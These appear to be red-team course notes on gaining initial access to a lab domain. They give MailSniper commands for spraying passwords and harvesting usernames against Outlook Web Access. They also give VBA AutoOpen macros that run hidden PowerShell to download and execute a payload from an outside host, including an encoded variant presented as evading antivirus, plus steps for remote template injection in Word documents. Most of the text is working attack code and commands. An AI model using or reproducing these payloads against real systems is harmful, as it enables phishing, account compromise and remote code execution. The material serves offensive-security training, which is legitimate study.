# Spraying passwords with MailSniper

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

---

# Enumerate NetBIOS

```bash
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
```

---

# Finding valid usernames (https://gist.github.com/superkojiman/11076951)

With a list of usernames like so:
Bob Farmer
Isable Yates
John King

```bash
./namemash.py names.txt > possible.txt

Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```

---

# Download Global Address List (Credentials needed)

```bash
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

---

# Checking the Zone of a file

```bash
Get-Content .\test.txt -Stream Zone.Identifier
```

---

# VBA Macro with Cobalt

1. Create a http listener
2. Go to Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for your HTTP listener
3. Copy the powershell command to a VBA macro

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub
```

4. Add the macro to a file ended with `.doc`
5. We can now pass the file as an attachment on an email (preferred way),
   or host the file "Site Management > Host File"

---

# Remove template injection

1. Create a http listener
2. Go to Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for your HTTP listener
3. Copy the powershell command to a VBA macro

```vba
# This will probably get caught by the AV
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

End Sub

# This won't be caught by AV
Sub AutoOpen()

    Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    Set obj = shellWindows.Item()
    obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0

End Sub
```

4. Add the macro to a file ended with `.dot`
5. Serve this file via "Site Management > Host file" and give it 'http://nickelviper.com/template.dot'
6. Create another file ending with `.docx` and right click it. Then 7-zip > Open archive
7. Navigate to word > \_rels, and edit `settings.xml.rels`
8. Add our served file as the "Target" => Target="http://nickelviper.com/template.dot"

Optional (https://github.com/JohnWoodman/remoteinjector)

```bash
python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```

---

# HTML Smuggling

(Not recommeded because it changes the zone of the downloaded file to zone 3)

```bash
https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/37172329-html-smuggling
```
